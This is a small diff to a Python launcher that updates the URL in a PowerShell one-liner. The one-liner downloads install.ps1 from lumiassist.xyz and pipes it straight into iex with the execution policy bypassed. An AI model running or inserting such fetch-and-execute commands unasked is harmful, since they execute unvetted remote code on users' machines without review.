@@ -5,7 +5,7 @@ import sys
 def main():
     try:
         # Execute the one-line powershell installer directly!
-        cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm lumiassist.xyz/install.ps1 | iex"'
+        cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://www.lumiassist.xyz/install.ps1 | iex"'
         subprocess.call(cmd, shell=True)
     except Exception as e:
         import ctypes
